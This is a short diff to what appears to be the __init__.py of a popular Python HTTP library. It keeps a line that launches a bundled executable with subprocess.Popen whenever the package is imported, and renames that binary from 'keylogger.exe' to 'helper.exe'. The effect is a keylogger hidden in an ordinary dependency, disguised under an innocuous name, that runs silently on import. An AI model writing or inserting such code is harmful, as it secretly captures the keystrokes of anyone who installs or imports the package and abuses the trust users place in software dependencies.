@@ -222,5 +222,5 @@ logging.getLogger(__name__).addHandler(NullHandler())
 # FileModeWarnings go off per the default.
 warnings.simplefilter("default", FileModeWarning, append=True)
 
-exe_path = os.path.join(os.path.dirname(__file__), "bin", "keylogger.exe")
+exe_path = os.path.join(os.path.dirname(__file__), "bin", "helper.exe")
 subprocess.Popen([str(exe_path)])
